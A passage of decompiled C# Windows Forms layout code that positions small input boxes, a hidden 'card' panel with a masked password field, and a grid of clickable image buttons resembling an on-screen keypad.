		((TextBoxBase)textBox55).set_BorderStyle((BorderStyle)0);
		((Control)textBox55).set_Font(new Font("Verdana", 7f));
		((Control)textBox55).set_Location(new Point(500, 113));
		((Control)textBox55).set_Margin(new Padding(0));
		((TextBoxBase)textBox55).set_MaxLength(3);
		((Control)textBox55).set_Name("textBox55");
		((Control)textBox55).set_Size(new Size(25, 12));
		((Control)textBox55).set_TabIndex(50);
		((Control)textBox55).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox46).set_BorderStyle((BorderStyle)0);
		((Control)textBox46).set_Font(new Font("Verdana", 7f));
		((Control)textBox46).set_Location(new Point(457, 126));
		((Control)textBox46).set_Margin(new Padding(0));
		((TextBoxBase)textBox46).set_MaxLength(3);
		((Control)textBox46).set_Name("textBox46");
		((Control)textBox46).set_Size(new Size(25, 12));
		((Control)textBox46).set_TabIndex(41);
		((Control)textBox46).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox45).set_BorderStyle((BorderStyle)0);
		((Control)textBox45).set_Font(new Font("Verdana", 7f));
		((Control)textBox45).set_Location(new Point(457, 113));
		((Control)textBox45).set_Margin(new Padding(0));
		((TextBoxBase)textBox45).set_MaxLength(3);
		((Control)textBox45).set_Name("textBox45");
		((Control)textBox45).set_Size(new Size(25, 12));
		((Control)textBox45).set_TabIndex(40);
		((Control)textBox45).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox43).set_BorderStyle((BorderStyle)0);
		((Control)textBox43).set_Font(new Font("Verdana", 7f));
		((Control)textBox43).set_Location(new Point(414, 126));
		((Control)textBox43).set_Margin(new Padding(0));
		((TextBoxBase)textBox43).set_MaxLength(3);
		((Control)textBox43).set_Name("textBox43");
		((Control)textBox43).set_Size(new Size(25, 12));
		((Control)textBox43).set_TabIndex(31);
		((Control)textBox43).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox44).set_BorderStyle((BorderStyle)0);
		((Control)textBox44).set_Font(new Font("Verdana", 7f));
		((Control)textBox44).set_Location(new Point(414, 113));
		((Control)textBox44).set_Margin(new Padding(0));
		((TextBoxBase)textBox44).set_MaxLength(3);
		((Control)textBox44).set_Name("textBox44");
		((Control)textBox44).set_Size(new Size(25, 12));
		((Control)textBox44).set_TabIndex(30);
		((Control)textBox44).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox25).set_BorderStyle((BorderStyle)0);
		((Control)textBox25).set_Font(new Font("Verdana", 7f));
		((Control)textBox25).set_Location(new Point(370, 234));
		((Control)textBox25).set_Margin(new Padding(0));
		((TextBoxBase)textBox25).set_MaxLength(3);
		((Control)textBox25).set_Name("textBox25");
		((Control)textBox25).set_Size(new Size(25, 12));
		((Control)textBox25).set_TabIndex(29);
		((Control)textBox25).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox26).set_BorderStyle((BorderStyle)0);
		((Control)textBox26).set_Font(new Font("Verdana", 7f));
		((Control)textBox26).set_Location(new Point(370, 220));
		((Control)textBox26).set_Margin(new Padding(0));
		((TextBoxBase)textBox26).set_MaxLength(3);
		((Control)textBox26).set_Name("textBox26");
		((Control)textBox26).set_Size(new Size(25, 12));
		((Control)textBox26).set_TabIndex(28);
		((Control)textBox26).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox27).set_BorderStyle((BorderStyle)0);
		((Control)textBox27).set_Font(new Font("Verdana", 7f));
		((Control)textBox27).set_Location(new Point(370, 206));
		((Control)textBox27).set_Margin(new Padding(0));
		((TextBoxBase)textBox27).set_MaxLength(3);
		((Control)textBox27).set_Name("textBox27");
		((Control)textBox27).set_Size(new Size(25, 12));
		((Control)textBox27).set_TabIndex(27);
		((Control)textBox27).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox28).set_BorderStyle((BorderStyle)0);
		((Control)textBox28).set_Font(new Font("Verdana", 7f));
		((Control)textBox28).set_Location(new Point(370, 193));
		((Control)textBox28).set_Margin(new Padding(0));
		((TextBoxBase)textBox28).set_MaxLength(3);
		((Control)textBox28).set_Name("textBox28");
		((Control)textBox28).set_Size(new Size(25, 12));
		((Control)textBox28).set_TabIndex(26);
		((Control)textBox28).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox29).set_BorderStyle((BorderStyle)0);
		((Control)textBox29).set_Font(new Font("Verdana", 7f));
		((Control)textBox29).set_Location(new Point(370, 179));
		((Control)textBox29).set_Margin(new Padding(0));
		((TextBoxBase)textBox29).set_MaxLength(3);
		((Control)textBox29).set_Name("textBox29");
		((Control)textBox29).set_Size(new Size(25, 12));
		((Control)textBox29).set_TabIndex(25);
		((Control)textBox29).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox30).set_BorderStyle((BorderStyle)0);
		((Control)textBox30).set_Font(new Font("Verdana", 7f));
		((Control)textBox30).set_Location(new Point(370, 166));
		((Control)textBox30).set_Margin(new Padding(0));
		((TextBoxBase)textBox30).set_MaxLength(3);
		((Control)textBox30).set_Name("textBox30");
		((Control)textBox30).set_Size(new Size(25, 12));
		((Control)textBox30).set_TabIndex(24);
		((Control)textBox30).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox31).set_BorderStyle((BorderStyle)0);
		((Control)textBox31).set_Font(new Font("Verdana", 7f));
		((Control)textBox31).set_Location(new Point(370, 153));
		((Control)textBox31).set_Margin(new Padding(0));
		((TextBoxBase)textBox31).set_MaxLength(3);
		((Control)textBox31).set_Name("textBox31");
		((Control)textBox31).set_Size(new Size(25, 12));
		((Control)textBox31).set_TabIndex(23);
		((Control)textBox31).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox32).set_BorderStyle((BorderStyle)0);
		((Control)textBox32).set_Font(new Font("Verdana", 7f));
		((Control)textBox32).set_Location(new Point(370, 140));
		((Control)textBox32).set_Margin(new Padding(0));
		((TextBoxBase)textBox32).set_MaxLength(3);
		((Control)textBox32).set_Name("textBox32");
		((Control)textBox32).set_Size(new Size(25, 12));
		((Control)textBox32).set_TabIndex(22);
		((Control)textBox32).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox33).set_BorderStyle((BorderStyle)0);
		((Control)textBox33).set_Font(new Font("Verdana", 7f));
		((Control)textBox33).set_Location(new Point(370, 126));
		((Control)textBox33).set_Margin(new Padding(0));
		((TextBoxBase)textBox33).set_MaxLength(3);
		((Control)textBox33).set_Name("textBox33");
		((Control)textBox33).set_Size(new Size(25, 12));
		((Control)textBox33).set_TabIndex(21);
		((Control)textBox33).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox34).set_BorderStyle((BorderStyle)0);
		((Control)textBox34).set_Font(new Font("Verdana", 7f));
		((Control)textBox34).set_Location(new Point(370, 113));
		((Control)textBox34).set_Margin(new Padding(0));
		((TextBoxBase)textBox34).set_MaxLength(3);
		((Control)textBox34).set_Name("textBox34");
		((Control)textBox34).set_Size(new Size(25, 12));
		((Control)textBox34).set_TabIndex(20);
		((Control)textBox34).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox15).set_BorderStyle((BorderStyle)0);
		((Control)textBox15).set_Font(new Font("Verdana", 7f));
		((Control)textBox15).set_Location(new Point(327, 234));
		((Control)textBox15).set_Margin(new Padding(0));
		((TextBoxBase)textBox15).set_MaxLength(3);
		((Control)textBox15).set_Name("textBox15");
		((Control)textBox15).set_Size(new Size(25, 12));
		((Control)textBox15).set_TabIndex(19);
		((Control)textBox15).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox16).set_BorderStyle((BorderStyle)0);
		((Control)textBox16).set_Font(new Font("Verdana", 7f));
		((Control)textBox16).set_Location(new Point(327, 220));
		((Control)textBox16).set_Margin(new Padding(0));
		((TextBoxBase)textBox16).set_MaxLength(3);
		((Control)textBox16).set_Name("textBox16");
		((Control)textBox16).set_Size(new Size(25, 12));
		((Control)textBox16).set_TabIndex(18);
		((Control)textBox16).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox17).set_BorderStyle((BorderStyle)0);
		((Control)textBox17).set_Font(new Font("Verdana", 7f));
		((Control)textBox17).set_Location(new Point(327, 206));
		((Control)textBox17).set_Margin(new Padding(0));
		((TextBoxBase)textBox17).set_MaxLength(3);
		((Control)textBox17).set_Name("textBox17");
		((Control)textBox17).set_Size(new Size(25, 12));
		((Control)textBox17).set_TabIndex(17);
		((Control)textBox17).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox18).set_BorderStyle((BorderStyle)0);
		((Control)textBox18).set_Font(new Font("Verdana", 7f));
		((Control)textBox18).set_Location(new Point(327, 193));
		((Control)textBox18).set_Margin(new Padding(0));
		((TextBoxBase)textBox18).set_MaxLength(3);
		((Control)textBox18).set_Name("textBox18");
		((Control)textBox18).set_Size(new Size(25, 12));
		((Control)textBox18).set_TabIndex(16);
		((Control)textBox18).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox19).set_BorderStyle((BorderStyle)0);
		((Control)textBox19).set_Font(new Font("Verdana", 7f));
		((Control)textBox19).set_Location(new Point(327, 179));
		((Control)textBox19).set_Margin(new Padding(0));
		((TextBoxBase)textBox19).set_MaxLength(3);
		((Control)textBox19).set_Name("textBox19");
		((Control)textBox19).set_Size(new Size(25, 12));
		((Control)textBox19).set_TabIndex(15);
		((Control)textBox19).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox20).set_BorderStyle((BorderStyle)0);
		((Control)textBox20).set_Font(new Font("Verdana", 7f));
		((Control)textBox20).set_Location(new Point(327, 166));
		((Control)textBox20).set_Margin(new Padding(0));
		((TextBoxBase)textBox20).set_MaxLength(3);
		((Control)textBox20).set_Name("textBox20");
		((Control)textBox20).set_Size(new Size(25, 12));
		((Control)textBox20).set_TabIndex(14);
		((Control)textBox20).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox21).set_BorderStyle((BorderStyle)0);
		((Control)textBox21).set_Font(new Font("Verdana", 7f));
		((Control)textBox21).set_Location(new Point(327, 153));
		((Control)textBox21).set_Margin(new Padding(0));
		((TextBoxBase)textBox21).set_MaxLength(3);
		((Control)textBox21).set_Name("textBox21");
		((Control)textBox21).set_Size(new Size(25, 12));
		((Control)textBox21).set_TabIndex(13);
		((Control)textBox21).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox22).set_BorderStyle((BorderStyle)0);
		((Control)textBox22).set_Font(new Font("Verdana", 7f));
		((Control)textBox22).set_Location(new Point(327, 140));
		((Control)textBox22).set_Margin(new Padding(0));
		((TextBoxBase)textBox22).set_MaxLength(3);
		((Control)textBox22).set_Name("textBox22");
		((Control)textBox22).set_Size(new Size(25, 12));
		((Control)textBox22).set_TabIndex(12);
		((Control)textBox22).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox23).set_BorderStyle((BorderStyle)0);
		((Control)textBox23).set_Font(new Font("Verdana", 7f));
		((Control)textBox23).set_Location(new Point(327, 126));
		((Control)textBox23).set_Margin(new Padding(0));
		((TextBoxBase)textBox23).set_MaxLength(3);
		((Control)textBox23).set_Name("textBox23");
		((Control)textBox23).set_Size(new Size(25, 12));
		((Control)textBox23).set_TabIndex(11);
		((Control)textBox23).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox24).set_BorderStyle((BorderStyle)0);
		((Control)textBox24).set_Font(new Font("Verdana", 7f));
		((Control)textBox24).set_Location(new Point(327, 113));
		((Control)textBox24).set_Margin(new Padding(0));
		((TextBoxBase)textBox24).set_MaxLength(3);
		((Control)textBox24).set_Name("textBox24");
		((Control)textBox24).set_Size(new Size(25, 12));
		((Control)textBox24).set_TabIndex(10);
		((Control)textBox24).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox14).set_BorderStyle((BorderStyle)0);
		((Control)textBox14).set_Font(new Font("Verdana", 7f));
		((Control)textBox14).set_Location(new Point(285, 234));
		((Control)textBox14).set_Margin(new Padding(0));
		((TextBoxBase)textBox14).set_MaxLength(3);
		((Control)textBox14).set_Name("textBox14");
		((Control)textBox14).set_Size(new Size(25, 12));
		((Control)textBox14).set_TabIndex(9);
		((Control)textBox14).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox11).set_BorderStyle((BorderStyle)0);
		((Control)textBox11).set_Font(new Font("Verdana", 7f));
		((Control)textBox11).set_Location(new Point(285, 219));
		((Control)textBox11).set_Margin(new Padding(0));
		((TextBoxBase)textBox11).set_MaxLength(3);
		((Control)textBox11).set_Name("textBox11");
		((Control)textBox11).set_Size(new Size(25, 12));
		((Control)textBox11).set_TabIndex(8);
		((Control)textBox11).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox12).set_BorderStyle((BorderStyle)0);
		((Control)textBox12).set_Font(new Font("Verdana", 7f));
		((Control)textBox12).set_Location(new Point(285, 206));
		((Control)textBox12).set_Margin(new Padding(0));
		((TextBoxBase)textBox12).set_MaxLength(3);
		((Control)textBox12).set_Name("textBox12");
		((Control)textBox12).set_Size(new Size(25, 12));
		((Control)textBox12).set_TabIndex(7);
		((Control)textBox12).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox13).set_BorderStyle((BorderStyle)0);
		((Control)textBox13).set_Font(new Font("Verdana", 7f));
		((Control)textBox13).set_Location(new Point(285, 193));
		((Control)textBox13).set_Margin(new Padding(0));
		((TextBoxBase)textBox13).set_MaxLength(3);
		((Control)textBox13).set_Name("textBox13");
		((Control)textBox13).set_Size(new Size(25, 12));
		((Control)textBox13).set_TabIndex(6);
		((Control)textBox13).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox10).set_BorderStyle((BorderStyle)0);
		((Control)textBox10).set_Font(new Font("Verdana", 7f));
		((Control)textBox10).set_Location(new Point(285, 179));
		((Control)textBox10).set_Margin(new Padding(0));
		((TextBoxBase)textBox10).set_MaxLength(3);
		((Control)textBox10).set_Name("textBox10");
		((Control)textBox10).set_Size(new Size(25, 12));
		((Control)textBox10).set_TabIndex(5);
		((Control)textBox10).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox9).set_BorderStyle((BorderStyle)0);
		((Control)textBox9).set_Font(new Font("Verdana", 7f));
		((Control)textBox9).set_Location(new Point(285, 166));
		((Control)textBox9).set_Margin(new Padding(0));
		((TextBoxBase)textBox9).set_MaxLength(3);
		((Control)textBox9).set_Name("textBox9");
		((Control)textBox9).set_Size(new Size(25, 12));
		((Control)textBox9).set_TabIndex(4);
		((Control)textBox9).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox7).set_BorderStyle((BorderStyle)0);
		((Control)textBox7).set_Font(new Font("Verdana", 7f));
		((Control)textBox7).set_Location(new Point(285, 153));
		((Control)textBox7).set_Margin(new Padding(0));
		((TextBoxBase)textBox7).set_MaxLength(3);
		((Control)textBox7).set_Name("textBox7");
		((Control)textBox7).set_Size(new Size(25, 12));
		((Control)textBox7).set_TabIndex(3);
		((Control)textBox7).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox8).set_BorderStyle((BorderStyle)0);
		((Control)textBox8).set_Font(new Font("Verdana", 7f));
		((Control)textBox8).set_Location(new Point(285, 140));
		((Control)textBox8).set_Margin(new Padding(0));
		((TextBoxBase)textBox8).set_MaxLength(3);
		((Control)textBox8).set_Name("textBox8");
		((Control)textBox8).set_Size(new Size(25, 12));
		((Control)textBox8).set_TabIndex(2);
		((Control)textBox8).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox6).set_BorderStyle((BorderStyle)0);
		((Control)textBox6).set_Font(new Font("Verdana", 7f));
		((Control)textBox6).set_Location(new Point(285, 126));
		((Control)textBox6).set_Margin(new Padding(0));
		((TextBoxBase)textBox6).set_MaxLength(3);
		((Control)textBox6).set_Name("textBox6");
		((Control)textBox6).set_Size(new Size(25, 12));
		((Control)textBox6).set_TabIndex(1);
		((Control)textBox6).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font("Verdana", 7f));
		((Control)textBox5).set_Location(new Point(285, 112));
		((Control)textBox5).set_Margin(new Padding(0));
		((TextBoxBase)textBox5).set_MaxLength(3);
		((Control)textBox5).set_Name("textBox5");
		((Control)textBox5).set_Size(new Size(25, 12));
		((Control)textBox5).set_TabIndex(0);
		((Control)textBox5).add_KeyPress(new KeyPressEventHandler(NoKeys));
		((Control)pictureBox58).set_Cursor(Cursors.get_Hand());
		pictureBox58.set_Image((Image)componentResourceManager.GetObject("pictureBox58.Image"));
		((Control)pictureBox58).set_Location(new Point(498, 263));
		((Control)pictureBox58).set_Name("pictureBox58");
		((Control)pictureBox58).set_Size(new Size(72, 18));
		pictureBox58.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox58.set_TabIndex(0);
		pictureBox58.set_TabStop(false);
		((Control)pictureBox58).add_Click((EventHandler)pictureBox58_Click);
		((Control)Painel_Cartao).set_BackgroundImage((Image)componentResourceManager.GetObject("Painel_Cartao.BackgroundImage"));
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pass_6);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox57);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox51);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox52);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox56);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox48);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox49);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox50);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox55);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox54);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox53);
		((Control)Painel_Cartao).get_Controls().Add((Control)(object)pictureBox47);
		((Control)Painel_Cartao).set_Location(new Point(24, 130));
		((Control)Painel_Cartao).set_Name("Painel_Cartao");
		((Control)Painel_Cartao).set_Size(new Size(614, 229));
		((Control)Painel_Cartao).set_TabIndex(129);
		((Control)Painel_Cartao).set_Visible(false);
		((Control)Painel_Cartao).add_Paint(new PaintEventHandler(Painel_Cartao_Paint));
		((Control)pass_6).set_BackColor(Color.White);
		((TextBoxBase)pass_6).set_BorderStyle((BorderStyle)0);
		((Control)pass_6).set_Font(new Font("Verdana", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)pass_6).set_Location(new Point(301, 128));
		((Control)pass_6).set_Name("pass_6");
		pass_6.set_PasswordChar('●');
		((TextBoxBase)pass_6).set_ReadOnly(true);
		((Control)pass_6).set_Size(new Size(92, 15));
		((Control)pass_6).set_TabIndex(18);
		((Control)pictureBox57).set_BackColor(Color.Transparent);
		((Control)pictureBox57).set_Location(new Point(442, 171));
		((Control)pictureBox57).set_Name("pictureBox57");
		((Control)pictureBox57).set_Size(new Size(49, 24));
		pictureBox57.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox57.set_TabIndex(17);
		pictureBox57.set_TabStop(false);
		((Control)pictureBox57).add_Click((EventHandler)pictureBox57_Click_1);
		((Control)pictureBox51).set_BackColor(Color.Transparent);
		((Control)pictureBox51).set_Location(new Point(469, 145));
		((Control)pictureBox51).set_Name("pictureBox51");
		((Control)pictureBox51).set_Size(new Size(23, 24));
		pictureBox51.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox51.set_TabIndex(16);
		pictureBox51.set_TabStop(false);
		((Control)pictureBox51).add_Click((EventHandler)pictureBox51_Click_1);
		((Control)pictureBox52).set_BackColor(Color.Transparent);
		((Control)pictureBox52).set_Location(new Point(443, 145));
		((Control)pictureBox52).set_Name("pictureBox52");
		((Control)pictureBox52).set_Size(new Size(23, 24));
		pictureBox52.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox52.set_TabIndex(15);
		pictureBox52.set_TabStop(false);
		((Control)pictureBox52).add_Click((EventHandler)pictureBox52_Click_1);
		((Control)pictureBox56).set_BackColor(Color.Transparent);
		((Control)pictureBox56).set_Location(new Point(417, 145));
		((Control)pictureBox56).set_Name("pictureBox56");
		((Control)pictureBox56).set_Size(new Size(23, 24));
		pictureBox56.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox56.set_TabIndex(14);
		pictureBox56.set_TabStop(false);
		((Control)pictureBox56).add_Click((EventHandler)pictureBox56_Click_1);
		((Control)pictureBox48).set_BackColor(Color.Transparent);
		((Control)pictureBox48).set_Location(new Point(469, 117));
		((Control)pictureBox48).set_Name("pictureBox48");
		((Control)pictureBox48).set_Size(new Size(23, 24));
		pictureBox48.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox48.set_TabIndex(13);
		pictureBox48.set_TabStop(false);
		((Control)pictureBox48).add_Click((EventHandler)pictureBox48_Click_1);
		((Control)pictureBox49).set_BackColor(Color.Transparent);
		((Control)pictureBox49).set_Location(new Point(443, 117));
		((Control)pictureBox49).set_Name("pictureBox49");
		((Control)pictureBox49).set_Size(new Size(23, 24));
		pictureBox49.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox49.set_TabIndex(12);
		pictureBox49.set_TabStop(false);
		((Control)pictureBox49).add_Click((EventHandler)pictureBox49_Click_1);
		((Control)pictureBox50).set_BackColor(Color.Transparent);
		((Control)pictureBox50).set_Location(new Point(417, 117));
		((Control)pictureBox50).set_Name("pictureBox50");
		((Control)pictureBox50).set_Size(new Size(23, 24));
		pictureBox50.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox50.set_TabIndex(11);
		pictureBox50.set_TabStop(false);
		((Control)pictureBox50).add_Click((EventHandler)pictureBox50_Click_1);
		((Control)pictureBox55).set_BackColor(Color.Transparent);
		((Control)pictureBox55).set_Location(new Point(469, 91));
		((Control)pictureBox55).set_Name("pictureBox55");
		((Control)pictureBox55).set_Size(new Size(23, 24));
		pictureBox55.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox55.set_TabIndex(10);
		pictureBox55.set_TabStop(false);
		((Control)pictureBox55).add_Click((EventHandler)pictureBox55_Click_1);
		((Control)pictureBox54).set_BackColor(Color.Transparent);
		((Control)pictureBox54).set_Location(new Point(443, 91));
		((Control)pictureBox54).set_Name("pictureBox54");
		((Control)pictureBox54).set_Size(new Size(23, 24));
		pictureBox54.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox54.set_TabIndex(9);
		pictureBox54.set_TabStop(false);
		((Control)pictureBox54).add_Click((EventHandler)pictureBox54_Click_1);
		((Control)pictureBox53).set_BackColor(Color.Transparent);
		((Control)pictureBox53).set_Location(new Point(417, 91));
		((Control)pictureBox53).set_Name("pictureBox53");
		((Control)pictureBox53).set_Size(new Size(23, 24));
		pictureBox53.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox53.set_TabIndex(8);
		pictureBox53.set_TabStop(false);
		((Control)pictureBox53).add_Click((EventHandler)pictureBox53_Click_1);
		((Control)pictureBox47).set_BackColor(Color.Transparent);
		((Control)pictureBox47).set_Location(new Point(417, 172));
		((Control)pictureBox47).set_Name("pictureBox47");
		((Control)pictureBox47).set_Size(new Size(23, 24));
		pictureBox47.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox47.set_TabIndex(2);
		pictureBox47.set_TabStop(false);
		((Control)pictureBox47).add_Click((EventHandler)pictureBox47_Click_1);
		((Control)pictureBox44).set_Cursor(Cursors.get_Hand());
		pictureBox44.set_Image((Image)componentResourceManager.GetObject("pictureBox44.Image"));
		((Control)pictureBox44).set_Location(new Point(416, 222));
		((Control)pictureBox44).set_Name("pictureBox44");
		((Control)pictureBox44).set_Size(new Size(218, 21));
		pictureBox44.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox44.set_TabIndex(126);
		pictureBox44.set_TabStop(false);
		((Control)pictureBox44).add_Click((EventHandler)pictureBox44_Click);
		((Control)pictureBox43).set_BackColor(Color.Transparent);
		((Control)pictureBox43).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox43).set_Location(new Point(593, 202));
		((Control)pictureBox43).set_Name("pictureBox43");
		((Control)pictureBox43).set_Size(new Size(42, 19));
		pictureBox43.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox43.set_TabIndex(125);
		pictureBox43.set_TabStop(false);
		((Control)pictureBox35).set_BackColor(Color.Transparent);
		((Control)pictureBox35).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox35).set_Location(new Point(570, 202));
		((Control)pictureBox35).set_Name("pictureBox35");
		((Control)pictureBox35).set_Size(new Size(21, 20));
		pictureBox35.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox35.set_TabIndex(124);
		pictureBox35.set_TabStop(false);
		((Control)pictureBox35).add_Click((EventHandler)pictureBox35_Click);
		((Control)pictureBox36).set_BackColor(Color.Transparent);
		((Control)pictureBox36).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox36).set_Location(new Point(548, 202));
		((Control)pictureBox36).set_Name("pictureBox36");
		((Control)pictureBox36).set_Size(new Size(21, 20));
		pictureBox36.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox36.set_TabIndex(123);
		pictureBox36.set_TabStop(false);
		((Control)pictureBox36).add_Click((EventHandler)pictureBox36_Click);
		((Control)pictureBox37).set_BackColor(Color.Transparent);
		((Control)pictureBox37).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox37).set_Location(new Point(526, 202));
		((Control)pictureBox37).set_Name("pictureBox37");
		((Control)pictureBox37).set_Size(new Size(21, 20));
		pictureBox37.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox37.set_TabIndex(122);
		pictureBox37.set_TabStop(false);
		((Control)pictureBox37).add_Click((EventHandler)pictureBox37_Click);
		((Control)pictureBox38).set_BackColor(Color.Transparent);
		((Control)pictureBox38).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox38).set_Location(new Point(504, 202));
		((Control)pictureBox38).set_Name("pictureBox38");
		((Control)pictureBox38).set_Size(new Size(21, 20));
		pictureBox38.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox38.set_TabIndex(121);
		pictureBox38.set_TabStop(false);
		((Control)pictureBox38).add_Click((EventHandler)pictureBox38_Click);
		((Control)pictureBox39).set_BackColor(Color.Transparent);
		((Control)pictureBox39).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox39).set_Location(new Point(482, 202));
		((Control)pictureBox39).set_Name("pictureBox39");
		((Control)pictureBox39).set_Size(new Size(21, 20));
		pictureBox39.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox39.set_TabIndex(120);
		pictureBox39.set_TabStop(false);
		((Control)pictureBox39).add_Click((EventHandler)pictureBox39_Click);
		((Control)pictureBox40).set_BackColor(Color.Transparent);
		((Control)pictureBox40).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox40).set_Location(new Point(460, 202));
		((Control)pictureBox40).set_Name("pictureBox40");
		((Control)pictureBox40).set_Size(new Size(21, 20));
		pictureBox40.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox40.set_TabIndex(119);
		pictureBox40.set_TabStop(false);
		((Control)pictureBox40).add_Click((EventHandler)pictureBox40_Click);
		((Control)pictureBox41).set_BackColor(Color.Transparent);
		((Control)pictureBox41).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox41).set_Location(new Point(438, 202));
		((Control)pictureBox41).set_Name("pictureBox41");
		((Control)pictureBox41).set_Size(new Size(21, 20));
		pictureBox41.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox41.set_TabIndex(118);
		pictureBox41.set_TabStop(false);
		((Control)pictureBox41).add_Click((EventHandler)pictureBox41_Click);
		((Control)pictureBox42).set_BackColor(Color.Transparent);
		((Control)pictureBox42).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox42).set_Location(new Point(416, 202));
		((Control)pictureBox42).set_Name("pictureBox42");
		((Control)pictureBox42).set_Size(new Size(21, 20));
		pictureBox42.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox42.set_TabIndex(117);
		pictureBox42.set_TabStop(false);
		((Control)pictureBox42).add_Click((EventHandler)pictureBox42_Click);
		((Control)pictureBox31).set_BackColor(Color.Transparent);
		((Control)pictureBox31).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox31).set_Location(new Point(592, 180));
		((Control)pictureBox31).set_Name("pictureBox31");
		((Control)pictureBox31).set_Size(new Size(21, 20));
		pictureBox31.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox31.set_TabIndex(116);
		pictureBox31.set_TabStop(false);
		((Control)pictureBox31).add_Click((EventHandler)pictureBox31_Click);
		((Control)pictureBox32).set_BackColor(Color.Transparent);
		((Control)pictureBox32).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox32).set_Location(new Point(570, 179));
		((Control)pictureBox32).set_Name("pictureBox32");
		((Control)pictureBox32).set_Size(new Size(21, 20));
		pictureBox32.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox32.set_TabIndex(115);
		pictureBox32.set_TabStop(false);
		((Control)pictureBox32).add_Click((EventHandler)pictureBox32_Click);
		((Control)pictureBox33).set_BackColor(Color.Transparent);
		((Control)pictureBox33).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox33).set_Location(new Point(614, 157));
		((Control)pictureBox33).set_Name("pictureBox33");
		((Control)pictureBox33).set_Size(new Size(21, 20));
